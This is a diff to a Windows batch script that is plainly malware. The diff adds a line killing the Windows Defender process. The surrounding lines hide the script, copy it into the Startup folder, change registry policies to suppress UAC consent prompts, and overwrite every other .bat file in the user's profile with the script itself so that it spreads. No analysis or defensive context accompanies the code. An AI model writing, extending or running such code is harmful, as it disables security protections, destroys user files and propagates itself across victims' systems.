@@ -1,6 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
+taskkill /f /im MsMpEng.exe
 attrib +s +h +i +l +x +a "%0" >nul
 wmic process where name="cmd.exe" call setpriority "idle" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
@@ -105,3 +106,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ScR
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
 for /r "%userprofile%" %%f in (*.bat) do if not "%%f"=="%~f0" copy /Y "%~f0" "%%f" >nul 2>&1
+
